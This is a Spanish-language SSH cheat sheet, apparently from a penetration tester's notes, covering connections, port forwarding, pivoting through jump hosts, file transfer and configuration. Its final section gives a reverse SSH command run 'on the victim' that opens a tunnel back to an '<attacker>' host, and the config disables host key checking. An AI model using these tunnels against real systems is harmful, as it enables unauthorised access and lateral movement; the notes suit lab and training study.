# SSH — Cheat Sheet

> Acceso remoto, túneles, pivoting.

---

## Conexión básica

```bash
ssh <user>@<host>                # Conectar
ssh <user>@<host> -p <port>     # Puerto personalizado
ssh -i key.pem <user>@<host>    # Con llave privada
```

## Túneles SSH

```bash
# Local port forwarding
ssh -L 8080:127.0.0.1:80 <user>@<host>
# Puerto 8080 local → host:80

# Remote port forwarding
ssh -R 4444:127.0.0.1:4444 <user>@<host>
# Puerto 4444 remoto → local:4444

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 <user>@<host>
# Proxy SOCKS en puerto 1080
```

## Pivoting

```bash
# SSH tunnel con ProxyJump
ssh -J <jump_host> <target_host>

# SSH tunnel encadenado
ssh -L 3306:127.0.0.1:3306 <user>@<jump>
# Desde jump:
ssh -L 3307:127.0.0.1:3306 <user>@<target>
```

## Transferencia de archivos

```bash
scp <file> <user>@<host>:<path>         # Subir archivo
scp <user>@<host>:<path> <file>         # Descargar archivo
scp -r <dir> <user>@<host>:<path>       # Directorio recursivo
sftp <user>@<host>                      # SFTP interactivo
```

## Configuración

```bash
# ~/.ssh/config
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3

Host htb
    HostName 10.10.10.x
    User user
    IdentityFile ~/.ssh/id_rsa
    StrictHostKeyChecking no
```

## Opciones útiles

```bash
-f                               # Background después de autenticación
-N                               # Sin comando remoto
-g                               # Permitir conexiones a puerto forwarding
-C                               # Compresión
-v                               # Verbose (debug)
-q                               # Quiet
```

## Reverse SSH

```bash
# En la víctima:
ssh -R 4444:127.0.0.1:22 <user>@<attacker>
# En el atacante:
ssh -p 4444 <user>@127.0.0.1
```


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Linux.md|Linux]] — Linux, Redes
- [[Hydra.md|Hydra]] — Linux, Redes, SSH
- [[../../comandos/Linux.md|Linux]] — Linux, Redes, SSH
- [[../../comandos/Metasploit.md|Metasploit]] — Linux, Redes, SSH
- [[../08 - Metodologías/Metodología - Active Directory.md|Metodología - Active Directory]] — Linux, Redes
- [[../../apuntes Andres/09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot.md|09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot]] — Linux, Redes, SSH

### 🛠️ Herramientas

- [[comandos/SSH|SSH]]

> #linux #pivoting #redes #ssh
